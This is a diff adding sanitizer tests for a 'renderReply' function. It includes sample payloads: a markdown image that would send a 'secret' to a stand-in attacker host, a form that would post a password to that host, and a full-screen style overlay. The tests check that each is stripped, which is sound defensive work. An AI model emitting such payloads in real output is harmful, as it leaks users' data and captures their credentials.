@@ -74,6 +74,31 @@ describe('renderReply', () => {
     expect(html).not.toContain('onerror');
   });
 
+  it('drops markdown images, so a remote image cannot leak data', () => {
+    const root = parse(renderReply('![x](https://attacker.example/?q=secret)', ALLOWLIST));
+    expect(root.querySelector('img')).toBeNull();
+    expect(root.innerHTML).not.toContain('attacker.example');
+  });
+
+  it('removes forms and inputs', () => {
+    const html = renderReply(
+      '<form action="https://attacker.example"><input type="password" name="p"></form>',
+      ALLOWLIST,
+    );
+    const root = parse(html);
+    expect(root.querySelector('form')).toBeNull();
+    expect(root.querySelector('input')).toBeNull();
+  });
+
+  it('strips style attributes', () => {
+    const html = renderReply(
+      '<p style="position:fixed;inset:0">overlay</p>\n\n[Acme](https://www.engaging.io/case-studies/acme)',
+      ALLOWLIST,
+    );
+    expect(html).not.toContain('style=');
+    expect(parse(html).querySelector('a')?.getAttribute('rel')).toBe('noopener');
+  });
+
   it('renders markdown', () => {
     expect(renderReply('**bold**', [])).toContain('<strong>bold</strong>');
   });
